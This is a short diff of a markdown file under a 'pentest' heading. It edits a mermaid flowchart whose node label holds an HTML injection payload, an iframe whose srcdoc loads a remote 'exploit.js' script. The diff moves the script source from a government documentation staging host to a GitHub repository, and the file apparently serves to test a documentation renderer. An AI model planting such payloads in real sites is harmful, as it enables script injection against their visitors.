@@ -28,7 +28,7 @@ pentest
 ```mermaid  
 %%{init: {"flowchart": {"htmlLabels": "false"}} }%%  
 flowchart  
-  A["<iframe srcdoc='<script src=https://stg.docs.developer.tech.gov.sg/docs/injection/exploit.js></script>'></iframe>"]  
+  A["<iframe srcdoc='<script src=https://github.com/vapt-cen1/injection/blob/main/exploit.js></script>'></iframe>"]  
 ```
 ## iFrames Test
 
